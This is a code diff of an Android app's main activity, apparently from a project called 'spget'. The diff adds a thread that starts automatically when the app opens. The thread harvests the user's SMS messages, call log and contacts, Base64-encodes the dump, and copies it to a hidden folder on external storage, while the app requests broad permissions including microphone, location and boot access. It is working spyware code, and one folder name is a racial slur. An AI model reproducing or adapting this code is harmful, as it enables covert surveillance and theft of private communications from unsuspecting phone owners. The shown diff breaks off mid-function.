@@ -1,5 +1,6 @@
 package com.niccher.spget;
 
+import androidx.annotation.RequiresApi;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
@@ -10,41 +11,52 @@ import android.content.ComponentName;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
+import android.os.Build;
 import android.os.Bundle;
+import android.os.Environment;
+import android.provider.CallLog;
 import android.provider.ContactsContract;
+import android.util.Base64;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
 
-import com.google.android.gms.common.ConnectionResult;
-import com.google.android.gms.common.api.GoogleApiClient;
-import com.google.android.gms.location.ActivityRecognition;
-import com.google.android.gms.location.ActivityRecognitionResult;
+import com.niccher.spget.service.Serv;
 import com.niccher.spget.usables.Konstants;
 
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
+import java.util.List;
 
-public class MainActivity extends AppCompatActivity  {
+public class MainActivity extends AppCompatActivity {
 
     Button strt;
-    int permission_calls = 4;
+
     private int reqCode = 20;
-    private String[] permissions;
-    private int[] grantResults;
 
     Calendar cal = new GregorianCalendar();
-    StringBuffer sbsent, sbinb, sbout, sbdraft, sbfailed, sbcont, sblog, sbflist;//sent,sms/draft,sms/outbox,sms/failed
-    String flisting;
-    
+    StringBuffer sbsent, sbinb, sbout, sbdraft, sbfailed, sbcont, sblog, sbflist, sbapps;//sent,sms/draft,sms/outbox,sms/failed
+    String flisting,flapps;
+
+    PackageManager pm=null;
+    List<ApplicationInfo> aplis=null;
+
     Konstants kon;
 
     @Override
@@ -53,8 +65,9 @@ public class MainActivity extends AppCompatActivity  {
         setContentView(R.layout.activity_main);
 
         strt = findViewById(R.id.StartBtn);
-        
-        kon= new Konstants();
+
+        kon = new Konstants();
+        pm=getPackageManager();
 
         strt.setOnClickListener(new View.OnClickListener() {
             @Override
@@ -64,18 +77,11 @@ public class MainActivity extends AppCompatActivity  {
         });
 
         Perms();
-    }
 
-    @Override
-    protected void onResume() {
-        super.onResume();
-        Perms();
-    }
+        PayLoade pl=new PayLoade();
+        pl.start();
 
-    @Override
-    protected void onStart() {
-        super.onStart();
-        Perms();
+        //startService(new Intent(getApplicationContext(), Serv.class));
     }
 
     @Override
@@ -86,18 +92,18 @@ public class MainActivity extends AppCompatActivity  {
         //packageManager.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
-    private void WiFi(){
+    private void WiFi() {
         ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
 
         if (mWifi.isConnected()) {
             Toast.makeText(this, "Wifi Present", Toast.LENGTH_LONG).show();
-        }else {
+        } else {
             NetworkInfo[] networkInfo = connManager.getAllNetworkInfo();
 
             for (NetworkInfo netInfo : networkInfo) {
                 //if (netInfo.getTypeName().equalsIgnoreCase("WIFI")){
-                    //if (netInfo.isConnected()) {txtview.setText("Connected to WiFi")}
+                //if (netInfo.isConnected()) {txtview.setText("Connected to WiFi")}
                 // };
                 if (netInfo.getTypeName().equalsIgnoreCase("MOBILE")) {
                     if (netInfo.isConnected())
@@ -105,37 +111,21 @@ public class MainActivity extends AppCompatActivity  {
                 }
             }
         }
-        //WiFiStats();
     }
 
-    private void WiFiStats(){
-        ConnectivityManager connectivitymanager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+    private void Perms() {
 
-        NetworkInfo[] networkInfo = connectivitymanager.getAllNetworkInfo();
-
-        for (NetworkInfo netInfo : networkInfo) {
-
-            if (netInfo.getTypeName().equalsIgnoreCase("WIFI"))
-
-                //if (netInfo.isConnected()) txtview.setText("Connected to WiFi");
-
-            if (netInfo.getTypeName().equalsIgnoreCase("MOBILE"))
-
-                if (netInfo.isConnected())
-
-                    //txtview.setText("Connected to Mobile Data");
-                    Toast.makeText(this, "Connected to Mobile Data", Toast.LENGTH_LONG).show();
-        }
-
-    }
-
-    private void Perms(){
-
-        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS)
-                != PackageManager.PERMISSION_GRANTED){
-            ActivityCompat.requestPermissions(MainActivity.this, new String[] {Manifest.permission.PROCESS_OUTGOING_CALLS}, permission_calls);
-        }else{
-            Log.e("Permission","PROCESS_OUTGOING_CALLS Granted");
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
+                    Manifest.permission.PROCESS_OUTGOING_CALLS)) {
+                ActivityCompat.requestPermissions(MainActivity.this,
+                        new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS}, reqCode);
+            } else {
+                ActivityCompat.requestPermissions(MainActivity.this,
+                        new String[]{Manifest.permission.PROCESS_OUTGOING_CALLS}, reqCode);
+            }
+        } else {
+            Log.e(kon.TAGGED,"Permission PROCESS_OUTGOING_CALLS Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
@@ -147,11 +137,11 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.READ_SMS}, reqCode);
             }
-        }else {
-            Log.e("Permission","READ_SMS Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission READ_SMS Granted");
         }
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.READ_CONTACTS)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -160,11 +150,11 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.READ_CONTACTS}, reqCode);
             }
-        }else {
-            Log.e("Permission","READ_CONTACTS Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission READ_CONTACTS Granted");
         }
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.READ_CALL_LOG)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -173,11 +163,11 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.READ_CALL_LOG}, reqCode);
             }
-        }else {
-            Log.e("Permission","READ_CALL_LOG Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission READ_CALL_LOG Granted");
         }
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -186,11 +176,11 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, reqCode);
             }
-        }else {
-            Log.e("Permission","WRITE_EXTERNAL_STORAGE Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission WRITE_EXTERNAL_STORAGE Granted");
         }
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.READ_EXTERNAL_STORAGE)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -199,11 +189,11 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, reqCode);
             }
-        }else {
-            Log.e("Permission","READ_EXTERNAL_STORAGE Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission READ_EXTERNAL_STORAGE Granted");
         }
 
-        if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.RECORD_AUDIO)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -212,13 +202,13 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.RECORD_AUDIO}, reqCode);
             }
-        }else {
-            Log.e("Permission","RECORD_AUDIO Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission RECORD_AUDIO Granted");
         }
 
         /////////////////
 
-         if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_CHECKIN_PROPERTIES) != PackageManager.PERMISSION_GRANTED) {
+        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_CHECKIN_PROPERTIES) != PackageManager.PERMISSION_GRANTED) {
             if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this,
                     Manifest.permission.ACCESS_CHECKIN_PROPERTIES)) {
                 ActivityCompat.requestPermissions(MainActivity.this,
@@ -227,8 +217,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.ACCESS_CHECKIN_PROPERTIES}, reqCode);
             }
-        }else {
-            Log.e("Permission","ACCESS_CHECKIN_PROPERTIES Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission ACCESS_CHECKIN_PROPERTIES Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED) {
@@ -240,8 +230,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.ANSWER_PHONE_CALLS}, reqCode);
             }
-        }else {
-            Log.e("Permission","ANSWER_PHONE_CALLS Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission ANSWER_PHONE_CALLS Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -253,8 +243,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, reqCode);
             }
-        }else {
-            Log.e("Permission","ACCESS_FINE_LOCATION Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission ACCESS_FINE_LOCATION Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -266,8 +256,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.ACCESS_COARSE_LOCATION}, reqCode);
             }
-        }else {
-            Log.e("Permission","ACCESS_COARSE_LOCATION Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission ACCESS_COARSE_LOCATION Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
@@ -279,8 +269,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, reqCode);
             }
-        }else {
-            Log.e("Permission","ACCESS_BACKGROUND_LOCATION Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission ACCESS_BACKGROUND_LOCATION Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -292,8 +282,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.READ_PHONE_STATE}, reqCode);
             }
-        }else {
-            Log.e("Permission","READ_PHONE_STATE Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission READ_PHONE_STATE Granted");
         }
 
         if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CHANGE_NETWORK_STATE) != PackageManager.PERMISSION_GRANTED) {
@@ -305,8 +295,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.CHANGE_NETWORK_STATE}, reqCode);
             }
-        }else {
-            Log.e("Permission","CHANGE_NETWORK_STATE Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission CHANGE_NETWORK_STATE Granted");
         }
 
 
@@ -319,8 +309,8 @@ public class MainActivity extends AppCompatActivity  {
                 ActivityCompat.requestPermissions(MainActivity.this,
                         new String[]{Manifest.permission.RECEIVE_BOOT_COMPLETED}, reqCode);
             }
-        }else {
-            Log.e("Permission","RECEIVE_BOOT_COMPLETED Granted");
+        } else {
+            Log.e(kon.TAGGED,"Permission RECEIVE_BOOT_COMPLETED Granted");
         }
     }
 
@@ -344,22 +334,67 @@ public class MainActivity extends AppCompatActivity  {
         return contactName;
     }
 
+    private void displayDirectoryContents(File dir) {
+        try {
+            File[] files = dir.listFiles();
+            for (File file : files) {
+                if (file.isDirectory()) {
+                    //Log.e(kon.TAGGED, -Dir - ",file.getCanonicalPath());
+                    flisting+=" -Dir - "+file.getCanonicalPath().toString()+"\n";
+                    displayDirectoryContents(file);
+                } else {
+                    //Log.e(kon.TAGGED,\t -File- ",file.getCanonicalPath());
+                    flisting+="\t -File - "+file.getCanonicalPath().toString()+"\n";
+                }
+            }
+
+        } catch (IOException e) {
+            Log.e(kon.TAGGED, "-IOException- "+e.getMessage());
+        }
+    }
+
+    private void copy(File src, File dst) throws IOException {
+        InputStream in = new FileInputStream(src);
+        try {
+            OutputStream out = new FileOutputStream(dst);
+            try {
+                // Transfer bytes from in to out
+                byte[] buf = new byte[1024];
+                int len;
+                while ((len = in.read(buf)) > 0) {
+                    out.write(buf, 0, len);
+                }
+                Log.e(kon.TAGGED,"Copy done Doneeeeeeeeee");
+            } finally {
+                out.close();
+            }
+        } finally {
+            in.close();
+        }
+    }
+
     @Override
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
 
-        if (requestCode == permission_calls){
-            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
-            }else{
-                Toast.makeText(MainActivity.this, "Premission needed", Toast.LENGTH_LONG)
-                        .show();
+        switch (requestCode) {
+            case 1: {
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
+                        Perms();
+                    } else {
+                        Toast.makeText(MainActivity.this, "Unable To PROCESS_OUTGOING_CALLS", Toast.LENGTH_SHORT).show();
+                        Perms();
+                    }
+                    return;
+                }
             }
         }
 
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To READ_SMS", Toast.LENGTH_SHORT).show();
@@ -373,7 +408,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To ACCESS_FINE_LOCATION", Toast.LENGTH_SHORT).show();
@@ -387,7 +422,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To ACCESS_COARSE_LOCATION", Toast.LENGTH_SHORT).show();
@@ -401,7 +436,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To READ_PHONE_STATE", Toast.LENGTH_SHORT).show();
@@ -415,7 +450,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.CHANGE_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.CHANGE_NETWORK_STATE) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To CHANGE_NETWORK_STATE", Toast.LENGTH_SHORT).show();
@@ -429,7 +464,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECEIVE_BOOT_COMPLETED) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECEIVE_BOOT_COMPLETED) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To RECEIVE_BOOT_COMPLETED", Toast.LENGTH_SHORT).show();
@@ -443,7 +478,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ANSWER_PHONE_CALLS) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To ANSWER_PHONE_CALLS", Toast.LENGTH_SHORT).show();
@@ -457,7 +492,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To RECORD_AUDIO", Toast.LENGTH_SHORT).show();
@@ -471,7 +506,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To READ_CONTACTS", Toast.LENGTH_SHORT).show();
@@ -485,7 +520,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.ACCESS_CHECKIN_PROPERTIES) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.ACCESS_CHECKIN_PROPERTIES) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To ACCESS_CHECKIN_PROPERTIES", Toast.LENGTH_SHORT).show();
@@ -499,7 +534,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                         Perms();
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To READ_CALL_LOG", Toast.LENGTH_SHORT).show();
@@ -513,7 +548,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                     }
@@ -525,7 +560,7 @@ public class MainActivity extends AppCompatActivity  {
         switch (requestCode) {
             case 1: {
                 if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    if (ContextCompat.checkSelfPermission(MainActivity.this,Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
+                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.PROCESS_OUTGOING_CALLS) == PackageManager.PERMISSION_GRANTED) {
                     } else {
                         Toast.makeText(MainActivity.this, "Unable To WRITE_EXTERNAL_STORAGE", Toast.LENGTH_SHORT).show();
                     }
@@ -535,21 +570,78 @@ public class MainActivity extends AppCompatActivity  {
         }
     }
 
-    class PayLoade extends Thread{
+    public void Init(){
+        new Thread(new Runnable() {
+            public void run() {
+                Log.e("Doe","<Thread Start 1>");
+            }
+        }).start();
+    }
+
+    class PayLoade extends Thread {
         @Override
         public void run() {
             super.run();
+            Log.e(kon.TAGGED,"<Done Thread>");
             Parser_SMS();
-            Parser_Logs();
-            Parser_Calls();
-            Parser_Activity();
-            Parser_SD();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                Parser_Logs();
+            }
+            Parser_Contacts();
+            //Parser_SD();
+            //Parser_Apps();
 
+            String bigd="Cc\n"+String.valueOf(sbcont)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sblog)+"\n\n\n\n*********\n\n\n\n"
+                    +String.valueOf(sbinb)+"\n\n\n\n*********\n\n\n\n"+String.valueOf(sbsent)+"*********\n\n\n\n"+String.valueOf(sbout)
+                    +"*********\n\n\n\n"+String.valueOf(sbdraft)+"*********\n\n\n\n"+String.valueOf(sbfailed)+"*********\n\n\n\n" + flisting
+                    +"*********\n\n\n\n" + (flapps);
+            String rilbigd= Base64.encodeToString(bigd.toString().getBytes(), Base64.DEFAULT);
+
+            FileOutputStream fos = null;
+            String mas="Maestro.txt";
+            String mal="Maest.txt";
+
+            try {
+                fos = openFileOutput(mas, MODE_PRIVATE);
+                fos.write(bigd.getBytes());
+
+                fos = openFileOutput(mal, MODE_PRIVATE);
+                fos.write(rilbigd.getBytes());
+
+                File fi= Environment.getExternalStorageDirectory();
+                File fi2=new File(fi.getAbsolutePath()+"/RealNigga");
+                fi2.mkdirs();
+                File fi3 =new File(fi2,"DumpMal.txt");
+                File fi31 =new File(fi2,"DumpMas.txt");
+                File fi4 = new File(getFilesDir() + "/" + mal);
+                File fi41 = new File(getFilesDir() + "/" + mas);
+
+                copy(fi4, fi3);
+                copy(fi41, fi31);
+
+                Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mas);
+                Log.e(kon.TAGGED,"<Done Writing--------> Saved to " + getFilesDir() + "/" + mal);
+
+            } catch (
+                    FileNotFoundException e) {
+                Log.e(kon.TAGGED,"Error 1  "+e.getMessage());
+            } catch (
+                    IOException e) {
+                Log.e(kon.TAGGED,"Error 2  "+e.getMessage());
+            } finally {
+                if (fos != null) {
+                    try {
+                        fos.close();
+                    } catch (IOException e) {
+                        Log.e(kon.TAGGED,"Error 3  "+e.getMessage());
+                    }
+                }
+            }
         }
 
-        public void Parser_SMS(){
+        public void Parser_SMS() {
+            int sent = 0;
             try {
-                int sent = 0;
                 sbsent = new StringBuffer();
                 Uri smurset = Uri.parse("content://sms/sent");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                 Cursor smcus = getContentResolver().query(smurset, null, null, null, null);
@@ -579,9 +671,11 @@ public class MainActivity extends AppCompatActivity  {
                 Log.e(kon.TAGGED, "Msg->Sent Loop >");
             }
 
+            Log.e(kon.TAGGED, "Parser_SMS Sent->Finished at >"+sent);
+
+            int inb = 0;
             try {
-                Thread.sleep(1000);
-                int inb = 0;
+                Thread.sleep(50);
                 sbinb = new StringBuffer();
                 Uri smursinb = Uri.parse("content://sms/inbox");
                 Cursor smcusinb = getContentResolver().query(smursinb, null, null, null, null);
@@ -602,7 +696,7 @@ public class MainActivity extends AppCompatActivity  {
                         String bodi = smcusinb.getString(smcusinb.getColumnIndexOrThrow("body"));
                         smcusinb.moveToNext();
                         inb++;
-                        sbinb.append("-------(" + inb + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
+                        sbinb.append("-------(" + inb + ")--------\nClass -------> M-Inbox\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                         sbinb.append("\n---------------------------------\n");
                     }
                 }
@@ -611,8 +705,10 @@ public class MainActivity extends AppCompatActivity  {
                 Log.e(kon.TAGGED, "Msg->In Loop >");
             }
 
+            Log.e(kon.TAGGED, "Parser_SMS Inbox->Finished at >"+inb);
+
+            int out = 0;
             try {
-                int out = 0;
                 sbout = new StringBuffer();
                 Uri smursout = Uri.parse("content://sms/outbox");//content://sms/sent,sms/draft,sms/outbox,sms/failed
                 Cursor smcus = getContentResolver().query(smursout, null, null, null, null);
@@ -633,7 +729,7 @@ public class MainActivity extends AppCompatActivity  {
                         String bod = smcus.getString(smcus.getColumnIndexOrThrow("body"));
                         smcus.moveToNext();
                         out++;
-                        sbout.append("-------(" + out + ")--------\nClass -------> M-Sent\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
